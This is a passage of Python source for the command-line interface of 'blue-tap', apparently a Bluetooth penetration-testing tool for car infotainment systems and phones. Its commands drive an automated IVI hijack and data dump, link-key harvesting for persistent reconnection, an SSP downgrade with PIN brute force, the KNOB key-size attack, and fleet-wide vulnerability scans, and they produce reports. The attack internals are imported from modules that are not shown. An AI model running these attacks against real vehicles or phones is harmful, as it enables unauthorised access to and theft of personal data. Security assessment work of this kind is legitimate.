                report.add_fingerprint(data)
            elif isinstance(data, list):
                report.add_recon_results(data)

        for entry in session_data.get("vuln", []):
            data = entry.get("data", [])
            if isinstance(data, list):
                report.add_vuln_findings(data)

        for entry in session_data.get("attack", []):
            data = entry.get("data", {})
            if isinstance(data, dict):
                report.attack_results.update(data)

        for entry in session_data.get("data", []):
            data = entry.get("data", {})
            cmd = entry.get("command", "")
            if "pbap" in cmd:
                report.add_pbap_results(data)
            elif "map" in cmd:
                report.add_map_results(data)

        for entry in session_data.get("fuzz", []):
            report.add_fuzz_results(entry.get("data", {}))

        for entry in session_data.get("dos", []):
            report.add_dos_results(entry.get("data", {}))

        for entry in session_data.get("audio", []):
            data = entry.get("data", {})
            report.add_audio_capture(
                data.get("file", ""),
                data.get("duration", 0),
                data.get("description", ""),
            )

        # Add generic command execution evidence from all categories.
        for category_name, entries in session_data.items():
            if not isinstance(entries, list):
                continue
            for entry in entries:
                data = entry.get("data", {})
                if isinstance(data, dict) and data.get("command_path"):
                    status = data.get("status", "unknown")
                    report.add_note(
                        f"Command: {data['command_path']} | "
                        f"Category: {category_name} | Status: {status}"
                    )

        # Pass full session metadata for timeline, scope, and methodology
        if hasattr(report, "add_session_metadata"):
            report.add_session_metadata(session.metadata)

        # Load structured fuzz data (crash DB, corpus stats, evidence files)
        report.load_fuzz_from_session(session.dir)

        # Add session metadata as a note
        meta = session.metadata
        report.add_note(
            f"Session: {meta.get('name')} | "
            f"Commands: {len(meta.get('commands', []))} | "
            f"Targets: {', '.join(meta.get('targets', []))}"
        )

        out_dir = session.dir
    elif dump_dir:
        report.load_from_directory(dump_dir)
        out_dir = dump_dir
    else:
        error("No session active and no dump directory specified.")
        error("Use: blue-tap -s <session> report  OR  blue-tap report <dir>")
        return

    if fmt == "html":
        out = output or os.path.join(out_dir, "report.html")
        report.generate_html(out)
    else:
        out = output or os.path.join(out_dir, "report.json")
        report.generate_json(out)

    summary = session.summary() if session else {}
    if summary:
        info(f"Session included {summary.get('total_commands', 0)} commands across "
             f"{len(summary.get('categories', []))} categories")


# ============================================================================
# AUTO - Automated Discovery and Attack
# ============================================================================
@main.command("auto")
@click.argument("ivi_mac", required=False, default=None)
@click.option("-d", "--duration", default=60, help="Scan duration (seconds)")
@click.option("-o", "--output", default="auto_output", help="Output directory")
@click.option("-i", "--hci", default="hci0")
def auto_cmd(ivi_mac, duration, output, hci):
    """Automated: discover phone, hijack IVI, dump data, report.

    \b
    Scans for phones near the target IVI, identifies the paired phone,
    then runs the full hijack chain automatically.

    With --session: uses session directory for output and logs all phases.
    Without --session: uses -o directory (default: auto_output/).
    """
    ivi_mac = resolve_address(ivi_mac, prompt="Select TARGET IVI")
    if not ivi_mac:
        return
    from blue_tap.attack.auto import AutoDiscovery
    from blue_tap.utils.session import get_session, log_command

    # Use session directory for output
    session = get_session()
    output = session.get_output_dir("auto") if session else output

    auto = AutoDiscovery(ivi_mac, hci=hci)
    try:
        results = auto.run_auto(output_dir=output, scan_duration=duration)
        os.makedirs(output, exist_ok=True)
        _save_json(results, os.path.join(output, "auto_results.json"))
        log_command("auto", results, category="attack", target=ivi_mac)
    except KeyboardInterrupt:
        warning("\nInterrupted by user")


# ============================================================================
# RUN - Execute Multiple Commands
# ============================================================================
@main.command("run")
@click.argument("commands", nargs=-1)
@click.option("--playbook", default=None, help="Playbook text file (one command per line)")
def run_cmd_seq(commands, playbook):
    """Execute multiple blue-tap commands in sequence.

    \b
    Each argument is a command string (quote if it has spaces):
      blue-tap -s mytest run "scan classic" "recon fingerprint TARGET" "vulnscan TARGET" "report"

    Use TARGET as a placeholder — you'll be prompted to select a device.

    Or use a playbook file (plain text, one command per line):
      blue-tap -s mytest run --playbook quick-recon.txt
    """
    import shlex
    from blue_tap.utils.session import get_session

    if playbook:
        if not os.path.exists(playbook):
            error(f"Playbook not found: {playbook}")
            return
        with open(playbook) as f:
            # Simple format: one command per line (not full YAML)
            commands = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    if not commands:
        error("No commands specified. Usage: blue-tap run \"scan classic\" \"vulnscan TARGET\"")
        return

    # Resolve TARGET placeholder
    target_addr = None
    needs_target = any("TARGET" in cmd.upper() for cmd in commands)
    if needs_target:
        target_addr = resolve_address(None, prompt="Select target for workflow")
        if not target_addr:
            error("Target selection cancelled")
            return

    console.rule("[bold cyan]Blue-Tap Workflow", style="cyan")
    info(f"Executing {len(commands)} command(s)")
    for i, cmd in enumerate(commands, 1):
        info(f"  {i}. {cmd}")
    console.print()

    results = []
    active_session = get_session()
    session_prefix = []
    if active_session:
        # Force subcommands to use the current session instead of spawning auto sessions.
        session_prefix = ["-s", active_session.name]
    for i, cmd_str in enumerate(commands, 1):
        # Replace TARGET placeholder
        if target_addr:
            cmd_str = re.sub(r'\bTARGET\b', target_addr, cmd_str)
            cmd_str = re.sub(r'\btarget\b', target_addr, cmd_str)

        console.rule(f"[bold]Step {i}/{len(commands)}: {cmd_str}", style="dim")

        try:
            # Parse the command string and invoke via Click
            args = shlex.split(cmd_str)
            if args and args[0] == "run":
                error("Nested 'run' command is not supported inside workflows")
                results.append({
                    "step": i,
                    "command": cmd_str,
                    "status": "error",
                    "error": "nested_run_not_supported",
                })
                continue
            ctx = main.make_context("blue-tap", session_prefix + list(args), parent=click.get_current_context())
            with ctx:
                main.invoke(ctx)
            results.append({"step": i, "command": cmd_str, "status": "success"})
        except KeyboardInterrupt:
            warning("Workflow interrupted by user")
            results.append({"step": i, "command": cmd_str, "status": "interrupted"})
            break
        except SystemExit as e:
            status = "success" if e.code in (None, 0) else "error"
            results.append({"step": i, "command": cmd_str, "status": status})
        except click.exceptions.UsageError as e:
            error(f"Invalid command: {e}")
            results.append({"step": i, "command": cmd_str, "status": "error", "error": str(e)})
        except Exception as e:
            error(f"Command failed: {e}")
            results.append({"step": i, "command": cmd_str, "status": "error", "error": str(e)})

    console.rule("[bold]Workflow Complete", style="cyan")
    succeeded = sum(1 for r in results if r["status"] == "success")
    failed = sum(1 for r in results if r["status"] == "error")
    info(f"Results: {succeeded} succeeded, {failed} failed out of {len(results)}")
    from blue_tap.utils.session import log_command
    log_command(
        "workflow_run",
        {
            "commands": list(commands),
            "results": results,
            "succeeded": succeeded,
            "failed": failed,
        },
        category="general",
    )


# ============================================================================
# SESSION - Session Management
# ============================================================================
@main.group()
def session():
    """Manage assessment sessions."""


@session.command("list")
def session_list():
    """List all sessions."""
    sessions_dir = os.path.join(".", "sessions")
    if not os.path.isdir(sessions_dir):
        info("No sessions found")
        return

    from rich.style import Style as _S
    table = Table(title="[bold cyan]Assessment Sessions[/bold cyan]",
                  show_lines=True, border_style="#666666",
                  header_style=_S(bold=True, color="#00d4ff"))
    table.add_column("Name", style="#00d4ff")
    table.add_column("Created", style="#666666")
    table.add_column("Commands", justify="right")
    table.add_column("Targets")
    table.add_column("Last Updated", style="#666666")

    for name in sorted(os.listdir(sessions_dir)):
        meta_file = os.path.join(sessions_dir, name, "session.json")
        if os.path.exists(meta_file):
            try:
                with open(meta_file) as f:
                    meta = json.load(f)
                table.add_row(
                    name,
                    meta.get("created", "")[:19],
                    str(len(meta.get("commands", []))),
                    ", ".join(meta.get("targets", []))[:40],
                    meta.get("last_updated", "")[:19],
                )
            except (json.JSONDecodeError, OSError):
                table.add_row(name, "?", "?", "", "?")

    console.print(table)


@session.command("show")
@click.argument("name")
def session_show(name):
    """Show details of a session."""
    from blue_tap.utils.session import Session
    try:
        s = Session(name)
        summary = s.summary()
        summary_panel("Session Details", {
            "Name": summary["name"],
            "Created": summary["created"],
            "Last Updated": summary["last_updated"],
            "Commands Run": str(summary["total_commands"]),
            "Targets": ", ".join(summary["targets"]) or "None",
            "Categories": ", ".join(summary["categories"]) or "None",
            "Files Saved": str(summary["files"]),
            "Directory": summary["directory"],
        })

        # Show command log
        if s.metadata.get("commands"):
            console.print("\n[bold]Command Log:[/bold]")
            for cmd in s.metadata["commands"]:
                console.print(
                    f"  [dim]{cmd.get('timestamp', '')[:19]}[/dim]  "
                    f"[cyan]{cmd.get('command', '')}[/cyan]  "
                    f"[dim]({cmd.get('category', '')})[/dim]  "
                    f"{cmd.get('target', '')}"
                )
    except Exception as e:
        error(f"Cannot load session: {e}")


# ============================================================================
# KEYS - Link Key Harvest & Persistent Access
# ============================================================================
@main.group()
def keys():
    """Link key harvest, storage, and persistent reconnection."""


@keys.command("harvest")
@click.argument("address", required=False, default=None)
@click.option("-d", "--duration", default=300, type=int,
              help="Capture duration in seconds (default: 300)")
@click.option("-i", "--hci", default="hci0")
def keys_harvest(address, duration, hci):
    """Capture a pairing exchange and extract the link key.

    \b
    Starts HCI packet capture, waits for the target to pair,
    then extracts and stores the link key for later reconnection.

    \b
    Usage:
      1. Run this command
      2. Initiate pairing from the target device (or trigger it separately)
      3. Wait for capture to detect the pairing exchange
      4. Link key is stored in the session key database
    """
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.key_harvest import KeyHarvester
    from blue_tap.utils.session import get_session

    session = get_session()
    session_dir = session.dir if session else "."

    harvester = KeyHarvester(hci=hci, session_dir=session_dir)
    info(f"Starting link key harvest for [bold]{address}[/bold]")
    info(f"Capturing for up to {duration}s — initiate pairing on the target now")

    result = harvester.harvest(address, duration=duration)
    if result:
        success(f"Link key captured: {result.get('link_key', '?')[:8]}...")
        success(f"Stored in key database for persistent access")
        if session:
            from blue_tap.utils.session import log_command
            log_command("key_harvest", result, category="attack", target=address)
    else:
        warning("No link key captured — pairing may not have occurred during capture window")


@keys.command("list")
@click.option("-i", "--hci", default="hci0")
def keys_list(hci):
    """List all stored link keys."""
    from blue_tap.attack.key_harvest import KeyDatabase
    from blue_tap.utils.session import get_session

    session = get_session()
    session_dir = session.dir if session else "."
    db_path = os.path.join(session_dir, "keys", "key_db.json")

    db = KeyDatabase(db_path)
    all_keys = db.list_all()

    if not all_keys:
        info("No stored link keys")
        return

    from rich.table import Table
    table = Table(title="Stored Link Keys")
    table.add_column("Device", style="bold")
    table.add_column("Key (preview)")
    table.add_column("Type")
    table.add_column("Captured")
    table.add_column("Verified", justify="center")
    table.add_column("Source")

    for entry in all_keys:
        key_preview = entry.get("link_key", "")[:16] + "..."
        verified = "[green]yes[/green]" if entry.get("verified") else "[dim]no[/dim]"
        table.add_row(
            entry.get("mac", "?"),
            key_preview,
            str(entry.get("key_type", "?")),
            entry.get("captured_at", "?")[:19],
            verified,
            entry.get("source", "?"),
        )
    console.print(table)


@keys.command("reconnect")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
def keys_reconnect(address, hci):
    """Reconnect to a device using a previously stored link key.

    \b
    Injects the stored key into BlueZ and attempts connection
    without re-pairing — proving persistent access.
    """
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.key_harvest import KeyHarvester
    from blue_tap.utils.session import get_session

    session = get_session()
    session_dir = session.dir if session else "."

    harvester = KeyHarvester(hci=hci, session_dir=session_dir)
    info(f"Attempting reconnection to [bold]{address}[/bold] using stored key")

    if harvester.reconnect(address):
        success("Reconnected using stored link key — persistent access confirmed")
    else:
        error("Reconnection failed — key may be expired or device re-paired")


@keys.command("verify")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
def keys_verify(address, hci):
    """Verify a stored link key is still valid."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.key_harvest import KeyHarvester
    from blue_tap.utils.session import get_session

    session = get_session()
    session_dir = session.dir if session else "."

    harvester = KeyHarvester(hci=hci, session_dir=session_dir)
    info(f"Verifying stored key for [bold]{address}[/bold]")

    if harvester.verify_key(address):
        success("Key is valid — device still accepts it")
    else:
        warning("Key verification failed — device may have re-paired or rotated keys")


# ============================================================================
# SSP-DOWNGRADE - Force Legacy Pairing
# ============================================================================
@main.group("ssp-downgrade")
def ssp_downgrade():
    """SSP downgrade attack — force legacy PIN pairing."""


@ssp_downgrade.command("probe")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
def ssp_probe(address, hci):
    """Check if target is vulnerable to SSP downgrade.

    \b
    Queries the target's pairing capabilities and determines
    if it can be forced from Secure Simple Pairing to legacy
    PIN mode where brute-force is possible.
    """
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.ssp_downgrade import SSPDowngradeAttack

    attack = SSPDowngradeAttack(address, hci=hci)
    info(f"Probing SSP capabilities for [bold]{address}[/bold]")

    result = attack.probe()
    console.print()

    from rich.table import Table
    table = Table(title="SSP Probe Results")
    table.add_column("Property", style="bold")
    table.add_column("Value")

    table.add_row("SSP Supported", "[green]Yes[/green]" if result.get("ssp_supported") else "[red]No[/red]")
    table.add_row("IO Capability", str(result.get("io_capability", "unknown")))
    table.add_row("BT Version", str(result.get("bt_version", "unknown")))
    table.add_row("Legacy Fallback", "[yellow]Possible[/yellow]" if result.get("legacy_fallback_possible") else "[green]Unlikely[/green]")

    for note in result.get("notes", []):
        table.add_row("Note", f"[dim]{note}[/dim]")

    console.print(table)

    from blue_tap.utils.session import log_command
    log_command("ssp_probe", result, category="vuln", target=address)


@ssp_downgrade.command("attack")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
@click.option("--pin-start", default=0, type=int, help="PIN range start (default: 0)")
@click.option("--pin-end", default=9999, type=int, help="PIN range end (default: 9999)")
@click.option("--delay", default=0.5, type=float, help="Delay between PIN attempts")
def ssp_attack(address, hci, pin_start, pin_end, delay):
    """Execute SSP downgrade + PIN brute force.

    \b
    Forces the target from Secure Simple Pairing to legacy PIN
    mode, then brute-forces the PIN.

    \b
    Attack phases:
      1. Disable local SSP, set IO cap to NoInputNoOutput
      2. Remove existing pairing
      3. Initiate pairing — target falls back to legacy PIN
      4. Brute force PIN from --pin-start to --pin-end
    """
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.ssp_downgrade import SSPDowngradeAttack

    attack = SSPDowngradeAttack(address, hci=hci)
    info(f"Starting SSP downgrade attack on [bold]{address}[/bold]")
    info(f"PIN range: {pin_start:04d} - {pin_end:04d}, delay: {delay}s")

    result = attack.downgrade_and_brute(pin_start=pin_start, pin_end=pin_end, delay=delay)

    console.print()
    if result.get("success"):
        pin = result.get("pin_found", "?")
        success(f"PIN found: [bold green]{pin}[/bold green]")
        success(f"Attempts: {result.get('attempts', '?')}, Time: {result.get('time_elapsed', 0):.1f}s")
    else:
        warning(f"Brute force completed without finding PIN ({result.get('attempts', 0)} attempts)")
        if result.get("lockout_detected"):
            warning("Lockout detected — target is rate-limiting pairing attempts")

    from blue_tap.utils.session import log_command
    log_command("ssp_downgrade", result, category="attack", target=address)


# ============================================================================
# KNOB - Key Negotiation of Bluetooth (CVE-2019-9506)
# ============================================================================
@main.group()
def knob():
    """KNOB attack — negotiate minimum encryption key size (CVE-2019-9506)."""


@knob.command("probe")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
def knob_probe(address, hci):
    """Check if target is vulnerable to KNOB attack.

    \b
    Checks BT version (KNOB affects 2.1-5.0 pre-patch), reads
    current encryption key size if connected, and checks if
    InternalBlue is available for LMP-level manipulation.
    """
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.knob import KNOBAttack

    attack = KNOBAttack(address, hci=hci)
    info(f"Probing KNOB vulnerability for [bold]{address}[/bold]")

    result = attack.probe()
    console.print()

    from rich.table import Table
    table = Table(title="KNOB Probe Results")
    table.add_column("Property", style="bold")
    table.add_column("Value")

    vuln_text = "[red]Likely Vulnerable[/red]" if result.get("likely_vulnerable") else "[green]Not Vulnerable[/green]"
    table.add_row("BT Version", str(result.get("bt_version", "unknown")))
    table.add_row("KNOB Vulnerable", vuln_text)
    table.add_row("Key Size Observed", str(result.get("min_key_size_observed", "N/A")))
    table.add_row("InternalBlue", "[green]Available[/green]" if result.get("internalblue_available") else "[dim]Not available[/dim]")
    table.add_row("Method", result.get("method", "N/A"))

    for detail in result.get("details", []):
        table.add_row("Detail", f"[dim]{detail}[/dim]")

    console.print(table)

    from blue_tap.utils.session import log_command
    log_command("knob_probe", result, category="vuln", target=address)


@knob.command("attack")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
@click.option("--key-size", default=1, type=int, help="Target key size in bytes (default: 1)")
def knob_attack(address, hci, key_size):
    """Execute KNOB attack — negotiate minimum key and brute force.

    \b
    Attack phases:
      1. Negotiate minimum encryption key size with target
      2. Brute force the reduced key space
      3. Report results with timing analysis

    \b
    Note: Full LMP manipulation requires InternalBlue (Broadcom/Cypress).
    Without it, uses btmgmt to set local minimum key size (limited effectiveness).
    """
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.knob import KNOBAttack

    attack = KNOBAttack(address, hci=hci)
    info(f"Executing KNOB attack on [bold]{address}[/bold]")
    info(f"Target key size: {key_size} byte(s) ({key_size * 8} bits, {2 ** (key_size * 8):,} candidates)")

    result = attack.execute()

    console.print()
    negotiate = result.get("negotiate", {})
    brute = result.get("brute_force", {})

    if negotiate.get("success"):
        success(f"Key negotiated to {negotiate.get('negotiated_key_size', '?')} byte(s)")
    else:
        warning(f"Key negotiation: {negotiate.get('method', 'N/A')}")

    if brute.get("key_found"):
        success(f"Key recovered: [bold green]{brute.get('key_hex', '?')}[/bold green]")
        success(f"Candidates tested: {brute.get('total_candidates', '?')}, Time: {brute.get('time_elapsed', 0):.2f}s")
    else:
        info(f"Brute force demonstration: {brute.get('total_candidates', '?')} candidates in {brute.get('time_elapsed', 0):.2f}s")

    from blue_tap.utils.session import log_command
    log_command("knob_attack", result, category="attack", target=address)


# ============================================================================
# FLEET - Fleet-Wide Assessment
# ============================================================================
@main.group()
def fleet():
    """Fleet-wide Bluetooth assessment — scan, classify, assess multiple devices."""


@fleet.command("scan")
@click.option("-d", "--duration", default=15, type=int, help="Scan duration in seconds")
@click.option("-i", "--hci", default="hci0")
def fleet_scan(duration, hci):
    """Scan and classify all nearby Bluetooth devices.

    \b
    Discovers Classic and BLE devices, classifies each as:
    IVI, phone, headset, computer, wearable, or unknown.
    """
    from blue_tap.attack.fleet import FleetAssessment

    assessment = FleetAssessment(hci=hci, scan_duration=duration)
    info(f"Scanning for {duration}s...")

    devices = assessment.scan()
    if not devices:
        warning("No devices discovered")
        return

    from rich.table import Table
    table = Table(title=f"Discovered Devices ({len(devices)})")
    table.add_column("Address", style="bold")
    table.add_column("Name")
    table.add_column("RSSI")
    table.add_column("Type")
    table.add_column("Classification", style="bold")

    class_colors = {"ivi": "red", "phone": "cyan", "headset": "yellow",
                    "computer": "blue", "wearable": "magenta", "unknown": "dim"}

    for dev in devices:
        cls = dev.get("classification", "unknown")
        color = class_colors.get(cls, "white")
        table.add_row(
            dev.get("address", "?"),
            dev.get("name", "Unknown"),
            str(dev.get("rssi", "")),
            dev.get("type", "Classic"),
            f"[{color}]{cls.upper()}[/{color}]",
        )
    console.print(table)

    ivi_count = sum(1 for d in devices if d.get("classification") == "ivi")
    phone_count = sum(1 for d in devices if d.get("classification") == "phone")
    info(f"Found: {ivi_count} IVI(s), {phone_count} phone(s), {len(devices) - ivi_count - phone_count} other(s)")

    from blue_tap.utils.session import log_command
    log_command("fleet_scan", devices, category="scan")


@fleet.command("assess")
@click.option("-d", "--duration", default=15, type=int, help="Scan duration")
@click.option("-i", "--hci", default="hci0")
@click.option("--all-devices", is_flag=True, help="Assess all devices, not just IVIs")
def fleet_assess(duration, hci, all_devices):
    """Scan, classify, and run vulnerability assessment on all IVIs.

    \b
    By default, only assesses devices classified as IVI.
    Use --all-devices to assess everything discovered.
    """
    from blue_tap.attack.fleet import FleetAssessment

    assessment = FleetAssessment(hci=hci, scan_duration=duration)
    info(f"Scanning for {duration}s...")

    devices = assessment.scan()
    if not devices:
        warning("No devices discovered")
        return

    device_class = None if all_devices else "ivi"
    class_label = "all devices" if all_devices else "IVIs"
    targets_to_assess = [d["address"] for d in devices
                         if device_class is None or d.get("classification") == device_class]

    if not targets_to_assess:
        warning(f"No {class_label} found to assess")
        return

    info(f"Assessing {len(targets_to_assess)} {class_label}...")
    results = assessment.assess(targets=targets_to_assess)

    console.print()
    for dev_result in results:
        addr = dev_result.get("address", "?")
        risk = dev_result.get("risk_rating", "UNKNOWN")
        findings = dev_result.get("findings", [])
        risk_color = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow",
                      "LOW": "green"}.get(risk, "dim")

        console.print(f"[bold]{addr}[/bold] — [{risk_color}]{risk}[/{risk_color}] ({len(findings)} findings)")
        for f in findings[:3]:
            sev = f.get("severity", "?")
            console.print(f"  [{sev.lower() if sev in ('HIGH','CRITICAL') else 'dim'}]{sev}[/] {f.get('name', '?')}")
        if len(findings) > 3:
            console.print(f"  [dim]... and {len(findings) - 3} more[/dim]")

    report = assessment.report()
    from blue_tap.utils.session import log_command
    log_command("fleet_assess", report, category="vuln")

    console.print()
    success(f"Fleet assessment complete: {report.get('assessed', 0)} devices assessed, "
            f"overall risk: [{risk_color}]{report.get('overall_risk', '?')}[/{risk_color}]")


@fleet.command("report")
@click.option("-d", "--duration", default=15, type=int, help="Scan duration")
@click.option("-i", "--hci", default="hci0")
@click.option("-o", "--output", default=None, help="Output file path")
@click.option("-f", "--format", "fmt", default="html", type=click.Choice(["html", "json"]))
def fleet_report(duration, hci, output, fmt):
    """Generate a consolidated fleet assessment report."""
    from blue_tap.attack.fleet import FleetAssessment

    assessment = FleetAssessment(hci=hci, scan_duration=duration)
    info(f"Running full fleet assessment (scan + classify + assess)...")

    devices = assessment.scan()
    if not devices:
        warning("No devices discovered")
        return

    ivi_targets = [d["address"] for d in devices if d.get("classification") == "ivi"]
    if ivi_targets:
        assessment.assess(targets=ivi_targets)

    report_data = assessment.report()

    out_path = output or f"fleet_report.{fmt}"
    if fmt == "json":
        _save_json(report_data, out_path)
    else:
        from blue_tap.report.generator import ReportGenerator
        rpt = ReportGenerator()
        rpt.add_scan_results(devices)
        for dev in report_data.get("devices", []):
            findings = dev.get("findings", [])
            if findings:
                rpt.add_vuln_findings(findings)
        rpt.generate_html(out_path)


# ============================================================================
# UTILITIES
# ============================================================================
def _save_json(data, filepath):
    """Save data to JSON file."""
    os.makedirs(os.path.dirname(filepath) if os.path.dirname(filepath) else ".", exist_ok=True)
    with open(filepath, "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {filepath}")


def cli():
    """Entry point that shows the banner before any Click processing."""
    banner()
    main()


if __name__ == "__main__":
    cli()
